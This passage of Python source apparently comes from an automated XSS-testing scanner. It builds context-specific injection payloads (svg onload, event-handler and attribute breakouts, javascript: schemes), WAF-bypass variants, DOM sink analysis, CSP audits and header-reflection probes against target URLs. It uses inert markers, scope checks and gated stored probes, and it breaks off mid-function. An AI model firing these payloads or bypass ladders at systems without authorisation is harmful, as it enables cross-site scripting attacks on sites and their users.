# STAGE D: CONTEXT PAYLOAD LADDER (structural probes, sab inert markers)
# ===========================================================================
def _ladder_payloads(context, canary):
    """context -> [(label, payload)] - breaker + tag-vector combos (inert).
    NOTE: TAG_VECTORS entries pehle se MARK_JS-baked hain (koi %s nahi)."""
    out = []
    if context in ("html-body", "raw-reflect"):
        for pv, lbl in TAG_VECTORS[:10]:
            out.append((lbl, pv if "%s" not in pv else pv % MARK_JS))
    elif context == "inside-tag":
        for pre, post in CTX_BREAKERS["inside-tag"]:
            out.append(("inside-tag-pre-%r" % pre, pre + "onmouseover=%s " % MARK_JS + post))
        out.append(("inside-tag-close", "><svg/onload=%s>" % MARK_JS))
    elif context in ("html-attr-dq", "form-value"):
        pre, post = CTX_BREAKERS["html-attr-dq"]
        out.append(("attr-dq-breakout", pre + TAG_VECTORS[0][0] + post))
        out.append(("attr-dq-script", pre + "<script>%s</script>" % MARK_JS + post))
        out.append(("attr-dq-event", pre + "\" onmouseover=%s x=\"" % MARK_JS))
    elif context == "html-attr-sq":
        pre, post = CTX_BREAKERS["html-attr-sq"]
        out.append(("attr-sq-breakout", pre + TAG_VECTORS[0][0] + post))
        out.append(("attr-sq-event", pre + "' onmouseover=%s x='" % MARK_JS))
    elif context == "html-attr-uq":
        pre, post = CTX_BREAKERS["html-attr-uq"]
        out.append(("attr-uq-breakout", pre + TAG_VECTORS[0][0] + post))
    elif context in ("js-string",):
        for pre, post in CTX_BREAKERS["js-string"]:
            out.append(("js-string-%r" % pre, pre + post))
    elif context == "js-tmpl":
        pre, post = CTX_BREAKERS["js-tmpl"]
        out.append(("tmpl-expr", pre + post))
    elif context == "js-raw":
        pre, post = CTX_BREAKERS["js-raw"]
        out.append(("js-raw-inject", pre + post))
    elif context == "html-comment":
        pre, post = CTX_BREAKERS["html-comment"]
        out.append(("comment-breakout", pre + TAG_VECTORS[0][0] + post))
    elif context == "rcdata":
        pre, post = CTX_BREAKERS["rcdata"]
        out.append(("rcdata-breakout", pre + TAG_VECTORS[0][0] + post))
    elif context == "noscript":
        pre, post = CTX_BREAKERS["noscript"]
        out.append(("noscript-breakout", pre + TAG_VECTORS[0][0] + post))
    elif context == "style-block":
        pre, post = CTX_BREAKERS["style-block"]
        out.append(("style-breakout", pre + TAG_VECTORS[0][0] + post))
    elif context == "style-attr":
        out.append(("style-expression-legacy", "x:expression(%s)" % MARK_JS))
    elif context in ("url-attr", "meta-refresh"):
        for sch, lbl in SCHEME_PROBES:
            out.append(("scheme-%s" % lbl, sch + "//wasp-x13.test"))
    return out


def reflected_probes_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage D: context-aware structural payload ladder -> verdicts."""
    ck = "stageD:reflected-probes"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        reflected_probes_findings(F, cached)
        ok("Stage D replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    budget = int(conf.get("xss_context_probes", 24))
    spent = 0
    records = []
    s404 = meta.get("soft404") or {}
    # sirf wo targets jinke paas stage C me context mila (verbatim/encoded)
    cmap = {}
    for rec in ctx.get("reflect_records", []):
        if rec.get("context") and rec.get("context") not in ("", "none"):
            cmap[(rec["url"].split("?")[0], rec["param"])] = rec
    for t in targets:
        if spent >= budget - 1:
            break
        url, param = t["url"], t["param"]
        key = (url.split("?")[0], param)
        crec = cmap.get(key)
        if crec is None:
            continue
        if is_confirmed(ctx, url, param, "xss-reflected"):
            continue
        context = crec.get("context") or "html-body"
        base = baseline_endpoint(http, url, conf, cp, tag="d")
        if not base.get("ok"):
            continue
        canary = make_canary(param)
        rec = {"url": url, "param": param, "context": context,
               "verdict": "SAFE", "signals": [], "waf": None}
        hit = None
        for lbl, payload in _ladder_payloads(context, canary):
            if spent >= budget:
                break
            probe = payload + "<" + canary + ">"   # unique suffix (freshness proof)
            r = _req(http, "GET", set_param(url, param, probe), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, probe, r, note="xss-ctx-%s" % lbl)
            waf_tag, _ = match_waf_block(r, base)
            if waf_tag:
                rec["verdict"] = "WAF_BLOCKED"
                rec["waf"] = waf_tag
                rec["signals"].append({"waf": waf_tag, "label": lbl})
                break
            # verbatim check: payload ka structural chunk + canary dono bache
            # (encoded reflection me structural chunk verbatim NAHI milega)
            structural = payload.strip()[:18]
            if canary in r.text and structural and structural in r.text:
                base_ctxn, _v, _s = which_reflection(base.get("text_sample", ""), canary)
                if base_ctxn:
                    rec["signals"].append({"note": "baseline me hi tha - noise"})
                    rec["verdict"] = "NOISE"
                    break
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"label": lbl, "payload_class": payload[:40],
                                       "status": r.status, "len": len(r.body)})
                mark_confirmed(ctx, url, param, "xss-reflected")
                hit = lbl
                break
            if canary in r.text:
                # canary bacha par structure nahi - partial filter
                if rec["verdict"] == "SAFE":
                    rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"label": lbl, "note": "canary-bacha-structure-nahi"})
        if hit or rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="reflected-probes %d probes" % spent)
    reflected_probes_findings(F, results)
    ok("Stage D done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def reflected_probes_findings(F, results):
    """FIX-4: stage D findings (cached replay par bhi). Context-specific keys."""
    _CTX_KEY = {
        "js-string": "xss_js_string_breakout", "js-tmpl": "xss_js_string_breakout",
        "js-raw": "xss_js_string_breakout",
        "url-attr": "xss_url_scheme_injection", "meta-refresh": "xss_url_scheme_injection",
        "rcdata": "xss_rcdata_breakout", "html-comment": "xss_comment_breakout",
        "noscript": "xss_noscript_mutation", "style-block": "xss_reflected_confirmed",
        "style-attr": "xss_reflected_confirmed",
    }
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        ctxn = rec.get("context", "")
        if rec.get("verdict") == "CONFIRMED":
            key = _CTX_KEY.get(ctxn, "xss_reflected_confirmed")
            F.add(key, "Reflected XSS (context=%s): %s" % (ctxn, rec["param"]),
                  ep, "Winning payload-class: %s | signals: %s"
                      % (rec.get("signals", [{}])[0].get("label", "?"),
                         json.dumps(rec.get("signals", []))[:280]),
                  evidence_ref="reflected_probes.json",
                  extra={"context": ctxn})
        elif rec.get("verdict") == "SUSPECTED":
            F.add("xss_reflected_partial", "Partial reflection (filtered): %s" % rec["param"],
                  ep, "Canary bacha par structural payload nahi - surviving-charset "
                      "se manual exploitability nikaalo (encode_matrix.json).",
                  evidence_ref="reflected_probes.json")
        elif rec.get("verdict") == "WAF_BLOCKED":
            F.add("xss_probe_blocked", "XSS probes WAF-blocked: %s" % rec["param"],
                  ep, "WAF: %s (stage E ka ranked input)" % rec.get("waf"),
                  evidence_ref="reflected_probes.json")


# ===========================================================================
# STAGE E: WAF/FILTER BYPASS LADDER (24 variants, winning-variant proof)
# ===========================================================================
def waf_bypass_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage E: blocked/partial params par encode/obfuscation ladder."""
    ck = "stageE:waf-bypass"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        waf_bypass_findings(F, cached)
        ok("Stage E replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("xss_waf_probes", 0):
        return {"records": [], "stats": {"probes": 0, "budget": 0}}
    budget = int(conf.get("xss_waf_probes", 14))
    spent = 0
    records = []
    s404 = meta.get("soft404") or {}
    # input: stage D/E-blocked ya partial records
    blocked = []
    for rec in ctx.get("reflect_records", []) + ctx.get("probe_records", []):
        if rec.get("verdict") in ("WAF_BLOCKED", "SUSPECTED"):
            blocked.append(rec)
    # dedupe by (url,param)
    seen = set()
    blocked = [b for b in blocked
               if (b["url"].split("?")[0], b["param"]) not in seen
               and not seen.add((b["url"].split("?")[0], b["param"]))]
    # fairness: WAF_BLOCKED pehle (bypass ladder ka primary input - FIX-2),
    # SUSPECTED (weak-filter) baad me budget bacha ho to
    blocked.sort(key=lambda r: 0 if r.get("verdict") == "WAF_BLOCKED" else 1)
    for b in blocked:
        if spent >= budget - 2:
            break
        url, param = b["url"], b["param"]
        if is_confirmed(ctx, url, param, "xss-bypass"):
            continue
        base = baseline_endpoint(http, url, conf, cp, tag="e")
        if not base.get("ok"):
            continue
        canary = make_canary(param)
        core = TAG_VECTORS[0][0]     # pehle se MARK_JS-baked ("<svg/onload=waspP13()>")
        rec = {"url": url, "param": param, "verdict": "SAFE", "winning_variant": None,
               "variants": [], "signals": []}
        for lbl, xform in WAF_BYPASS_VARIANTS:
            if spent >= budget:
                break
            try:
                payload = xform(core)
            except Exception:
                continue
            probe = payload + "<" + canary + ">"
            r = _req(http, "GET", set_param(url, param, probe), allow_redirects=False)
            spent += 1
            vres = {"variant": lbl, "status": (r.status if r and not r.error else None)}
            if r is None or r.error:
                rec["variants"].append(vres)
                continue
            capture(ctx, url, param, probe, r, note="xss-bypass-%s" % lbl)
            waf_tag, _ = match_waf_block(r, base)
            vres["waf"] = waf_tag or None
            if waf_tag:
                rec["variants"].append(vres)
                continue
            # winning = structural core reflect ho (baseline me NAHI tha) + canary
            # Rules: (1) raw_lit VERBATIM ho aur usme RAW '<' bacha ho (transform
            # ne tag-char encode kar diya to HTML-echo par hit nahi - json-unicode
            # / entity / fullwidth variants HTML endpoints par confirm nahi hote),
            # YA (2) response me raw '<tag on...=' event-handler markup ho jo
            # baseline me nahi tha (double-decode backends ke liye).
            core_frag = "svg/onload" if "svg" in core else "onerror"
            raw_lit = probe.split("<" + canary)[0]
            base_txt = base.get("text_sample", "").lower()
            evt_rx = r"(?i)<\s*[a-z]{1,12}[\s/]*on[a-z]{3,20}\s*="
            base_has_evt = bool(re.search(evt_rx, base_txt))
            hit_raw = raw_lit and ("<" in raw_lit) and raw_lit in r.text
            hit_frag = (bool(re.search(evt_rx, r.text))
                        and core_frag not in base_txt
                        and not base_has_evt)
            if canary in r.text and (hit_raw or hit_frag):
                vres["hit"] = True
                rec["variants"].append(vres)
                rec["verdict"] = "CONFIRMED"
                rec["winning_variant"] = lbl
                rec["signals"].append({"variant": lbl, "payload": probe[:80],
                                       "status": r.status})
                mark_confirmed(ctx, url, param, "xss-bypass")
                break
            rec["variants"].append(vres)
        if rec["verdict"] != "SAFE" or any(v.get("waf") for v in rec["variants"]):
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="waf-bypass %d probes" % spent)
    waf_bypass_findings(F, results)
    ok("Stage E done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def waf_bypass_findings(F, results):
    """FIX-4: stage E findings (cached replay par bhi)."""
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("xss_waf_bypassable",
                  "XSS WAF-bypass via %s: %s" % (rec.get("winning_variant"), rec["param"]),
                  ep, "Winning variant: %s | variants tried: %d | signal: %s"
                      % (rec.get("winning_variant"), len(rec.get("variants", [])),
                         json.dumps(rec.get("signals", []))[:260]),
                  evidence_ref="waf_bypass_xss.json",
                  extra={"winning_variant": rec.get("winning_variant")})

# ===========================================================================
# STAGE F: DOM XSS (static source/sink analysis - capture-based + capped fetch)
# ===========================================================================
_DOM_SRC_RX = [(re.compile(rx), tag) for rx, tag in DOM_SOURCES]
_DOM_SINK_RX = [(re.compile(rx), tag) for rx, tag in DOM_SINKS]
_DOM_FW_RX = [(re.compile(rx), tag) for rx, tag in DOM_FRAMEWORK_HINTS]
_CLIENT_PP_RX = [(re.compile(rx), tag) for rx, tag in CLIENT_PP_SINKS]
_SCRIPT_RX = re.compile(r"(?is)<script\b[^>]*>(.*?)</script>")
_SCRIPT_SRC_RX = re.compile(r"(?is)<script\b[^>]*\bsrc\s*=\s*['\"]([^'\"]+)['\"]")
_LISTENER_RX = re.compile(r"(?is)addEventListener\s*\(\s*['\"]message['\"]")
_ORIGIN_CHECK_RX = re.compile(r"(?is)event\.origin|e\.origin|msg\.origin")


def analyze_js_for_dom(js_text):
    """JS/HTML text -> {sources, sinks, listeners, frameworks, pp_gadgets} (pure)."""
    res = {"sources": [], "sinks": [], "listeners": 0, "listener_no_origin": False,
           "frameworks": [], "pp_gadgets": [], "same_script_link": False}
    for rx, tag in _DOM_SRC_RX:
        if rx.search(js_text):
            res["sources"].append(tag)
    for rx, tag in _DOM_SINK_RX:
        if rx.search(js_text):
            res["sinks"].append(tag)
    for rx, tag in _DOM_FW_RX:
        if rx.search(js_text) and tag not in res["frameworks"]:
            res["frameworks"].append(tag)
    for rx, tag in _CLIENT_PP_RX:
        if rx.search(js_text) and tag not in res["pp_gadgets"]:
            res["pp_gadgets"].append(tag)
    if _LISTENER_RX.search(js_text):
        res["listeners"] += 1
        # listener ke baad 400-char window me origin-check dhoondo (approx)
        m = _LISTENER_RX.search(js_text)
        window = js_text[m.end(): m.end() + 500]
        if not _ORIGIN_CHECK_RX.search(window):
            res["listener_no_origin"] = True
    # same-script source->sink link (static confidence)
    if res["sources"] and res["sinks"]:
        markup_sinks = {"innerHTML", "outerHTML", "document.write", "insertAdjacentHTML",
                        "jquery-html", "jquery-append", "jquery-parseHTML",
                        "jquery-selector-injection", "dynamic-src", "window-open"}
        if set(res["sinks"]) & markup_sinks:
            res["same_script_link"] = True
    return res


def dom_xss_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage F: captures se DOM analysis + capped fresh JS fetches."""
    ck = "stageF:dom-xss"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        dom_xss_findings(F, cached)
        ok("Stage F replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    fetch_budget = int(conf.get("xss_dom_fetch", 8))
    fetched = 0
    seen_urls = set()
    records = []

    def _analyze_and_record(url, text, src_label, extra=None):
        if not text:
            return
        an = analyze_js_for_dom(text)
        if not (an["sources"] or an["sinks"] or an["listeners"] or an["pp_gadgets"]):
            return
        rec = {"url": url, "source_of_analysis": src_label,
               "sources": an["sources"], "sinks": an["sinks"],
               "listeners": an["listeners"],
               "listener_no_origin": an["listener_no_origin"],
               "frameworks": an["frameworks"], "pp_gadgets": an["pp_gadgets"],
               "same_script_link": an["same_script_link"],
               "verdict": "SUSPECTED" if an["same_script_link"] else "SAFE"}
        if extra:
            rec.update(extra)
        records.append(rec)

    # 1) captures se (0 requests) - FIX-1
    for cap in ctx.get("captures", [])[:400]:
        page_url = cap.get("url", "")
        ep = page_url.split("?")[0]
        if ep in seen_urls:
            continue
        seen_urls.add(ep)
        _analyze_and_record(ep, cap.get("text", ""), "capture")

    # 2) inline scripts of target pages + capped fresh JS fetches
    for t in targets[:12]:
        ep = t["url"].split("?")[0]
        if ep in seen_urls:
            continue
        seen_urls.add(ep)
        base = baseline_endpoint(http, t["url"], conf, cp, tag="f")
        if not base.get("ok"):
            continue
        _analyze_and_record(ep, base.get("text_sample", ""), "baseline-fetch")
        for m in _SCRIPT_SRC_RX.finditer(base.get("text_sample", "")):
            src = m.group(1)
            if src.startswith("//") or src.lower().startswith("http"):
                # absolute URL - origin match ho tabhi (scope-safe, FIX-7)
                absu = src if src.startswith("http") else \
                    "{0.scheme}://{0.netloc}".format(urllib.parse.urlsplit(t["url"])) + src
                try:
                    if not scope.check_url(absu, raise_on_fail=False):
                        continue
                except Exception:
                    continue
            else:
                origin = "{0.scheme}://{0.netloc}".format(urllib.parse.urlsplit(t["url"]))
                absu = urllib.parse.urljoin(origin + urllib.parse.urlsplit(t["url"]).path, src)
            if fetched >= fetch_budget:
                break
            rj = _req(http, "GET", absu, allow_redirects=False)
            fetched += 1
            if rj is not None and not rj.error:
                _analyze_and_record(absu, rj.text[:6000], "js-fetch",
                                    extra={"file": src})

    results = {"records": records, "stats": {"pages_scanned": len(seen_urls),
                                             "js_fetched": fetched,
                                             "fetch_budget": fetch_budget}}
    cp.mark(ck, results, summary="dom-xss %d pages" % len(records))
    dom_xss_findings(F, results)
    ok("Stage F done: %d page(s) scanned, %d DOM record(s)" % (len(seen_urls), len(records)))
    return results


def dom_xss_findings(F, results):
    """FIX-4: stage F findings (cached replay par bhi)."""
    for rec in results.get("records", []):
        ep = rec["url"]
        if rec.get("same_script_link"):
            F.add("xss_dom_suspected",
                  "DOM XSS static link: %s" % ", ".join(rec.get("sinks", [])[:3]),
                  ep, "sources=%s sinks=%s (same inline script) - runtime PoC manual: "
                      "fragment/param me inert marker daal kar sink trigger dekho. "
                      "Frameworks: %s" % (rec.get("sources"), rec.get("sinks"),
                                          rec.get("frameworks")),
                  evidence_ref="dom_xss.json",
                  extra={"sources": rec.get("sources"), "sinks": rec.get("sinks")})
        elif rec.get("listener_no_origin"):
            F.add("xss_postmessage_no_origin", "postMessage listener w/o origin-check",
                  ep, "addEventListener('message') ke baad event.origin validate nahi "
                      "hota - cross-origin DOM-injection hypothesis.",
                  evidence_ref="dom_xss.json")
        elif rec.get("sinks"):
            F.add("xss_dom_sink_no_source", "Markup sink (source nahi mila)",
                  ep, "sinks=%s - gadget-chain hypothesis (PP/link-injection), "
                      "manual source hunt karo." % rec.get("sinks"),
                  evidence_ref="dom_xss.json")
        elif rec.get("sources"):
            F.add("xss_dom_source_no_sink", "DOM source (sink nahi mila)",
                  ep, "sources=%s - watch-list (future sinks)." % rec.get("sources"),
                  evidence_ref="dom_xss.json")
        if rec.get("pp_gadgets"):
            F.add("xss_client_pp_hint", "Client PP gadget: %s" % rec["pp_gadgets"][0],
                  ep, "deep-merge gadget %s + client __proto__ canary (GET, inert) "
                      "hypothesis - P20 logic handoff." % rec["pp_gadgets"],
                  evidence_ref="dom_xss.json")


# ===========================================================================
# STAGE G: STORED-XSS CANDIDATES (mapping + RoE-gated live probe)
# ===========================================================================
def stored_candidates_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage G: stored-XSS candidate mapping (hypothesis-first).
    Live probe sirf xss_allow_stored_probe=True par (RoE gate, P12
    nosql_login_probe wala pattern) - APNE test-account fields par."""
    ck = "stageG:stored-candidates"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        stored_findings(F, cached)
        ok("Stage G replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    allowed = bool(conf.get("xss_allow_stored_probe", False))
    budget = int(conf.get("xss_stored_probes", 4)) if allowed else 0
    spent = 0
    records = []
    for t in targets:
        fams = t.get("families") or []
        if "stored-candidate" not in fams:
            continue
        rec = {"url": t["url"], "param": t["param"], "verdict": "CANDIDATE",
               "probe_attempted": False, "signals": [],
               "manual_steps": "1) APNE test account me inert marker "
                               "(waspX13stored) save karo; 2) dusre session/"
                               "victim-sim view kholo; 3) marker render me "
                               "verbatim dikhe = stored confirm (confirm ke "
                               "baad bhi sirf marker discipline); 4) fix: "
                               "server-side allowlist sanitize + CSP."}
        if allowed and spent < budget:
            spent += 1
            rec["probe_attempted"] = True
            canary = "waspX13stored" + rand_str(4)
            # read-only intent probe: param ko GET me hi canary ke saath (render
            # preview-style endpoints) - write POST sirf wizard/manual path.
            r = _req(http, "GET", set_param(t["url"], t["param"], canary),
                     allow_redirects=False)
            if r is not None and not r.error:
                capture(ctx, t["url"], t["param"], canary, r, note="xss-stored-get")
                if canary in r.text:
                    rec["verdict"] = "CANDIDATE-ECHO"
                    rec["signals"].append({"echo": True, "status": r.status})
        records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget,
                                             "live_probe_allowed": allowed}}
    cp.mark(ck, results, summary="stored-candidates %d" % len(records))
    stored_findings(F, results)
    ok("Stage G done: %d candidate(s), live_probe=%s" % (len(records), allowed))
    return results


def stored_findings(F, results):
    """FIX-4: stage G findings (cached replay par bhi)."""
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CANDIDATE-ECHO":
            F.add("xss_stored_candidate",
                  "Stored-XSS candidate (echo): %s" % rec["param"],
                  ep, "Field echo + ripe-class (comment/profile family). Live "
                      "stored confirm RoE-gated manual steps record me hain.",
                  evidence_ref="stored_candidates.json")
        else:
            F.add("xss_stored_candidate",
                  "Stored-XSS candidate (ripe field): %s" % rec["param"],
                  ep, "Stored-ripe field-class mapped (live probe RoE-gated, "
                      "default OFF). Manual steps record me.",
                  evidence_ref="stored_candidates.json")


# ===========================================================================
# STAGE H: CSP & SECURITY-HEADER AUDIT (0 extra requests - headers se)
# ===========================================================================
def csp_audit_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage H: per-endpoint CSP parse + gap analysis (baseline headers)."""
    ck = "stageH:csp-audit"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        csp_findings(F, cached)
        ok("Stage H replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    records = []
    seen_ep = set()
    for t in targets:
        ep = t["url"].split("?")[0]
        if ep in seen_ep:
            continue
        seen_ep.add(ep)
        base = baseline_endpoint(http, t["url"], conf, cp, tag="h")
        if not base.get("ok"):
            continue
        snap = csp_snapshot_from_sample(base.get("headers") or {})
        csp = parse_csp(snap.get("csp", ""))
        gaps = csp_gaps(csp)
        records.append({"url": ep, "headers": snap, "csp": csp, "gaps": gaps,
                        "xss_protection": snap.get("x-xss", ""),
                        "nosniff": snap.get("nosniff", "")})
    results = {"records": records, "stats": {"endpoints": len(records)}}
    cp.mark(ck, results, summary="csp-audit %d" % len(records))
    csp_findings(F, results)
    ok("Stage H done: %d endpoint(s) CSP-audited" % len(records))
    return results


def csp_snapshot_from_sample(hdrs):
    """baseline headers dict -> security snapshot (pure)."""
    snap = {}
    for h, k in SECURITY_HEADERS_XSS:
        for hk, hv in (hdrs or {}).items():
            if hk.lower() == h.lower():
                snap[k] = hv
                break
    return snap


def csp_findings(F, results):
    """FIX-4: stage H findings (cached replay par bhi). Noise-cap: csp-missing
    sirf pehle 4 endpoints par (sab endpoints par same gap repeat nahi hota)."""
    n_missing = 0
    for rec in results.get("records", []):
        ep = rec["url"]
        for gap, detail in rec.get("gaps", []):
            if gap == "csp-missing":
                if n_missing >= 4:
                    continue
                n_missing += 1
                F.add("xss_csp_missing", "CSP header absent", ep,
                      "Content-Security-Policy set hi nahi hai - reflected/DOM "
                      "XSS findings ki exploitability boost (defense-gap).",
                      evidence_ref="csp_analysis.json")
            elif gap == "unsafe-inline":
                F.add("xss_csp_unsafe_inline", "CSP unsafe-inline", ep,
                      "script-src 'unsafe-inline' - nonce defense bypass; "
                      "reflected payloads execute-capable.",
                      evidence_ref="csp_analysis.json")
            else:
                F.add("xss_csp_weak", "CSP weak: %s" % gap, ep,
                      "%s - bypass hypothesis csp_analysis.json me." % detail,
                      evidence_ref="csp_analysis.json")

# ===========================================================================
# STAGE I: HEADER-REFLECT XSS VECTORS (Referer/UA/XFH -> body reflection)
# ===========================================================================
HEADER_PROBE_SET = [
    ("Referer", "https://wasp-x13.test/ref?m=%s"),          # reserved .test TLD
    ("User-Agent", "waspX13/%s MockBrowser"),
    ("X-Forwarded-Host", "%s.wasp-x13.invalid"),            # reserved .invalid TLD
    ("X-Original-URL", "/wasp-x13-orig-%s"),
    ("X-Rewrite-URL", "/wasp-x13-rewrite-%s"),
]


def header_reflect_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage I: header values body me verbatim reflect? (link-injection chains)
    FIX-6: redirects follow KABHI nahi. Sab hosts reserved TLDs (FIX-7)."""
    ck = "stageI:header-reflect"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        header_reflect_findings(F, cached)
        ok("Stage I replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    budget = int(conf.get("xss_header_probes", 6))
    spent = 0
    records = []
    for t in targets[:14]:
        if spent >= budget:
            break
        url = t["url"]
        base = baseline_endpoint(http, url, conf, cp, tag="i")
        if not base.get("ok"):
            continue
        rec = {"url": url, "verdict": "SAFE", "hits": []}
        for hname, tmpl in HEADER_PROBE_SET:
            if spent >= budget:
                break
            marker = "waspH" + rand_str(5)
            hval = tmpl % marker
            r = _req(http, "GET", url, headers={hname: hval}, allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, "header:%s" % hname, hval, r, note="xss-hdr-reflect")
            if marker in r.text or (hname == "X-Forwarded-Host" and hval in r.text):
                base_hit = marker in base.get("text_sample", "")
                if not base_hit:
                    rec["hits"].append({"header": hname, "marker": marker,
                                        "status": r.status})
                    rec["verdict"] = "CONFIRMED" if hval in r.text else "SUSPECTED"
        if rec["hits"]:
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="header-reflect %d probes" % spent)
    header_reflect_findings(F, results)
    ok("Stage I done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def header_reflect_findings(F, results):
    """FIX-4: stage I findings (cached replay par bhi)."""
    for rec in results.get("records", []):
        if rec.get("verdict") in ("CONFIRMED", "SUSPECTED"):
            F.add("xss_header_link_injection",
                  "Header reflect: %s" % ",".join(h["header"] for h in rec.get("hits", [])),
                  rec["url"], "Header values body me verbatim reflect hote hain "
                              "(markers: %s) - link/cache-poisoning building block "
                              "(P26 handoff)."
                              % ", ".join(h["marker"] for h in rec.get("hits", [])[:3]),
                  evidence_ref="header_reflect_xss.json",
                  extra={"headers": [h["header"] for h in rec.get("hits", [])]})


# ===========================================================================
# STAGE K: FAMOUS-TECHNIQUE MATRIX (mXSS/fullwidth/UTF-7/JSON-embed/...)
# ===========================================================================
def technique_matrix_stage(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage K: famous XSS techniques - probes jahan safe, warna hypothesis.
    Har technique ka (status, detail) record hota hai - report me proof detail."""
    ck = "stageK:technique-matrix"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        ok("Stage K replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    budget = int(conf.get("xss_technique_probes", 8))
    spent = 0
    records = []
    # --- mXSS (noscript mutation): static detect from captures
    mxss_pages = [c["url"].split("?")[0] for c in ctx.get("captures", [])
                  if "<noscript" in (c.get("text", "") or "").lower()][:6]
    records.append({"technique": "mxss-noscript", "status": "HYPOTHESIS" if mxss_pages
                    else "NOT-APPLICABLE",
                    "detail": "noscript-bearing pages: %s - innerHTML round-trip par "
                              "payload morph (mXSS family). Manual: marker ko "
                              "noscript-context me inject karke innerHTML re-read "
                              "dekho (browser-side, inert marker)." % mxss_pages[:3]})
    # --- fullwidth normalization (U+FF1C -> '<' post-normalize backends)
    if targets and spent < budget:
        t = targets[0]
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="k")
        if base.get("ok"):
            canary = make_canary(param)
            payload = "\uff1csvg onload=%s\uff1e<w-canary>" % MARK_JS
            probe = payload.replace("<w-canary>", canary)
            r = _req(http, "GET", set_param(url, param, probe), allow_redirects=False)
            spent += 1
            st = "NOT-REFLECTED"
            if r is not None and not r.error:
                capture(ctx, url, param, probe, r, note="xss-tech-fullwidth")
                if canary in r.text:
                    normalized = "<svg" in r.text and "\uff1csvg" not in r.text
                    st = "NORMALIZED-TO-TAG (bypass-class!)" if normalized else \
                        "FULLWIDTH-REFLECTED (browser me tag nahi banta - note)"
            records.append({"technique": "fullwidth-normalization", "status": st,
                            "url": url, "param": param,
                            "detail": "U+FF1C backend-normalization se '<' banta "
                                      "hai to filter-bypass class; warna note."})
    # --- JSON-in-script embedding (</ escape miss) - static from captures
    json_embed = []
    for c in ctx.get("captures", []):
        txt = c.get("text", "") or ""
        for m in re.finditer(r"(?is)<script[^>]*>(.{0,400}?)</script>", txt):
            inner = m.group(1)
            if re.search(r"(?i)[{\[]\s*['\"]", inner) and "</" in inner.replace("\\/", ""):
                json_embed.append(c["url"].split("?")[0])
                break
    records.append({"technique": "json-in-script-embed",
                    "status": "SUSPECTED" if json_embed else "NOT-FOUND",
                    "detail": "HTML pages me <script>-embedded JSON jisme raw '</' "
                              "sequence hai (escape-miss) -> json-script gadget "
                              "(P17 handoff). Pages: %s" % json_embed[:3]})
    # --- UTF-7 legacy (charset-dependent) - header check only, 0 probes
    records.append({"technique": "utf7-legacy", "status": "HYPOTHESIS",
                    "detail": "Response charset missing/IE-legacy ho to UTF-7 "
                              "encoding (+ADw-) historical vector; modern browsers "
                              "me dead - report me legacy note."})
    # --- dangling markup - hypothesis (external egress fix-7 ke bina PoC nahi)
    records.append({"technique": "dangling-markup", "status": "HYPOTHESIS",
                    "detail": "<img src='//... swallow-technique external canary "
                              "maangta hai - FIX-7 zero-egress rule se probe NAHI "
                              "bheja gaya; manual RoE-allowed canary host ke saath "
                              "karo (steps report me)."})
    # --- base-tag injection - hypothesis (early param control chahiye)
    records.append({"technique": "base-tag-injection", "status": "HYPOTHESIS",
                    "detail": "Agar koi early-reflect param <base> se PEHLE reflect "
                              "karta hai aur base-uri CSP absent hai (csp_analysis) "
                              "to relative-URL hijack possible - manual check."})
    # --- meta-refresh javascript: - captures se
    meta_js = []
    for c in ctx.get("captures", []):
        txt = (c.get("text", "") or "")[:3000]
        if re.search(r"(?is)<meta[^>]+http-equiv=['\"]?refresh", txt) and \
                re.search(r"(?is)content=['\"]?\d+\s*;\s*url=", txt):
            meta_js.append(c["url"].split("?")[0])
    records.append({"technique": "meta-refresh-url", "status": "HYPOTHESIS" if meta_js
                    else "NOT-APPLICABLE",
                    "detail": "meta-refresh pages: %s - url= value attacker-controlled "
                              "param se aaye to javascript:/data: scheme injection "
                              "(click-free nav). Probe: set url param = javascript: "
                              "inert marker (url-attr ladder ne already try kiya hoga)."
                              % meta_js[:3]})
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
